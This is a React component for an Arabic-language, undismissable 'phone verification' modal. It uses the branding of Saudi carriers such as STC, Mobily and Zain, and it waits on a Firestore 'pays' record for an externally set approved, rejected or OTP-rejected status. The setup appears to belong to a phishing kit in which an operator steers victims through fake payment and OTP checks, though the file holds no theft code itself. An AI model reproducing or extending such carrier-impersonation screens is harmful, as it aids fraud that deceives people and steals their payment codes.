import { useEffect, useRef, useCallback } from "react";
import {
  Dialog,
  DialogContent,
} from "@/components/ui/dialog";
import { Loader2, Phone } from "lucide-react";
import { db, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot, Firestore } from "firebase/firestore";

interface CarrierVerificationModalProps {
  open: boolean;
  carrier: string;
  visitorId: string;
  onApproved: () => void;
  onRejected: () => void;
  onOtpRejected: () => void;
}

export function CarrierVerificationModal({
  open,
  carrier,
  visitorId,
  onApproved,
  onRejected,
  onOtpRejected,
}: CarrierVerificationModalProps) {
  const unsubscribeRef = useRef<(() => void) | null>(null);
  const hasListenerRef = useRef(false);

  const carrierInfo: Record<string, { name: string; color: string; logo?: string }> = {
    stc: { name: "STC - الاتصالات السعودية", color: "#4f008c" },
    mobily: { name: "Mobily - موبايلي", color: "#009bdb" },
    zain: { name: "Zain - زين", color: "#e41c38" },
    virgin: { name: "Virgin Mobile", color: "#cc0000" },
    lebara: { name: "Lebara", color: "#ff6600" },
    salam: { name: "SALAM Mobile", color: "#00a550" },
    go: { name: "GO Telecom", color: "#0066cc" },
  };

  const currentCarrier = carrierInfo[carrier] || { name: "شركة الاتصالات", color: "#1a5c85" };

  const cleanup = useCallback(() => {
    if (unsubscribeRef.current) {
      unsubscribeRef.current();
      unsubscribeRef.current = null;
    }
    hasListenerRef.current = false;
  }, []);

  useEffect(() => {
    if (!open) {
      cleanup();
      return;
    }

    if (!visitorId || !isFirebaseConfigured || !db || hasListenerRef.current) return;

    hasListenerRef.current = true;

    unsubscribeRef.current = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data();

          if (data.phoneVerificationStatus === "approved") {
            cleanup();
            onApproved();
          } else if (data.phoneVerificationStatus === "rejected") {
            cleanup();
            onRejected();
          } else if (data.phoneVerificationStatus === "otp_rejected") {
            cleanup();
            onOtpRejected();
          }
        }
      },
      (error) => {
        console.error("[carrier-modal] Firestore listener error:", error);
      }
    );

    return cleanup;
  }, [open, visitorId, onApproved, onRejected, onOtpRejected, cleanup]);

  return (
    <Dialog open={open} onOpenChange={() => {}}>
      <DialogContent 
        className="sm:max-w-md" 
        dir="rtl"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <div className="flex flex-col items-center justify-center py-8 space-y-6">
          <div 
            className="w-20 h-20 rounded-full flex items-center justify-center"
            style={{ backgroundColor: currentCarrier.color }}
          >
            <Phone className="w-10 h-10 text-white" />
          </div>

          <div className="text-center space-y-2">
            <h3 className="text-xl font-bold text-foreground">
              جاري التحقق
            </h3>
            <p className="text-sm text-muted-foreground">
              جاري التحقق من رقم الجوال عبر
            </p>
            <p 
              className="font-semibold text-lg"
              style={{ color: currentCarrier.color }}
            >
              {currentCarrier.name}
            </p>
          </div>

          <div className="flex items-center justify-center gap-3">
            <Loader2 className="h-6 w-6 animate-spin text-primary" />
            <span className="text-sm text-muted-foreground">
              يرجى الانتظار...
            </span>
          </div>

          <div className="bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-700 rounded-lg p-4 w-full">
            <p className="text-sm text-center text-blue-900 dark:text-blue-100">
              لا تغلق هذه النافذة حتى يتم التحقق
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  );
}
